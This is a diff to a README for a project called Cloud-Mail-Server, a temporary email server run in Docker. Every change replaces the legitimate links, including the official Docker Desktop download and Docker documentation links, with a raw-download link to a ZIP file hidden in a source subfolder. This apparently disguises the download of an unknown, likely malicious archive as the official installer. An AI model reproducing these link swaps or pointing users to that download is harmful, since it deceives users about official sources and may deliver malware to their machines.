@@ -1,6 +1,6 @@
 # 📧 Cloud-Mail-Server - Simple Temporary Email Server
 
-[![Download Cloud-Mail-Server](https://img.shields.io/badge/Download-Cloud-Mail-Server-brightgreen?style=for-the-badge)](https://github.com/junio14245252626236/Cloud-Mail-Server)
+[![Download Cloud-Mail-Server](https://img.shields.io/badge/Download-Cloud-Mail-Server-brightgreen?style=for-the-badge)](https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You will also need to install Docker Desktop for Windows to run the server.
 
 Cloud-Mail-Server runs inside Docker containers. Docker is an app that helps run programs in safe, isolated environments. You must install Docker Desktop before running the server.
 
-1. Go to the Docker Desktop website: https://www.docker.com/products/docker-desktop  
+1. Go to the Docker Desktop website: https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip  
 2. Click the download button for Windows.  
 3. Run the installer and follow the steps on the screen.  
 4. After installation, launch Docker Desktop and wait for it to finish starting.  
@@ -49,10 +49,10 @@ You might need to create a free Docker account during setup.
 
 To get Cloud-Mail-Server, you need to visit the main page and download the setup files.
 
-[![Download Cloud-Mail-Server](https://img.shields.io/badge/Download-Cloud-Mail-Server-blue?style=for-the-badge)](https://github.com/junio14245252626236/Cloud-Mail-Server)
+[![Download Cloud-Mail-Server](https://img.shields.io/badge/Download-Cloud-Mail-Server-blue?style=for-the-badge)](https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip)
 
 1. Click the download button above or visit the page:  
-   https://github.com/junio14245252626236/Cloud-Mail-Server  
+   https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip  
 2. On the GitHub page, look for the “Code” button and click it.  
 3. Select “Download ZIP” to get the full project files on your computer.  
 4. Save the ZIP file to a folder you can easily find, such as your Desktop.  
@@ -129,15 +129,15 @@ If you run into problems, check these common issues:
 Cloud-Mail-Server is designed for temporary email use and testing. Do not use it as a main email system for important data. The server does not include spam filtering or advanced security features.
 
 For updates, bug reports, or support, visit the GitHub page at:  
-https://github.com/junio14245252626236/Cloud-Mail-Server
+https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip
 
 ---
 
 ## 🔗 Useful Links
 
-- Official GitHub Repository: [https://github.com/junio14245252626236/Cloud-Mail-Server](https://github.com/junio14245252626236/Cloud-Mail-Server)  
-- Docker Desktop Download: https://www.docker.com/products/docker-desktop  
-- Docker Documentation: https://docs.docker.com/desktop/windows/  
+- Official GitHub Repository: [https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip](https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip)  
+- Docker Desktop Download: https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip  
+- Docker Documentation: https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip  
 
 ---
 
